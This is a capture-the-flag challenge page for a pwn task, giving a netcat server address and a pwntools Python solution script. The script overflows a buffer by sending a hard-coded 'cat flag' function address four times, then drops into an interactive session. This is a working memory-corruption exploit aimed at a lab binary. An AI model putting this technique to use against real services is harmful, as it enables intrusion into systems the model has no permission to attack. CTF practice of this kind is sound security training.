#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20002

#### Solution
```python
#!/usr/bin/env python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

if len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
    Io = remote(host, port)
else:
    Io = process("./pwn")

cat_flag_addr = p64(0x0000000000400616)
payload = cat_flag_addr * 4
Io.send(payload)
Io.interactive()
```

#### Writeups
 * TODO

